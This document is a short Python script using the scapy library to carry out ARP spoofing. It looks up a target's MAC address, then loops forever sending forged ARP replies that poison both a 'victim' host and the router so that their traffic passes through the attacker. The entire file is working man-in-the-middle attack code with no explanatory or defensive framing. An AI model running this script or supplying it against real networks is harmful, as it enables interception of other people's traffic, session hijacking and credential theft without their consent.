from scapy.all import ARP, Ether, sendp, srp  # Fixed: Added 'srp'
import time

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(arp_packet, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

while True:
    arp_spoof("192.168.1.100", "192.168.1.1")  # Victim IP
    arp_spoof("192.168.1.1", "192.168.1.100")  # Router IP
    time.sleep(2)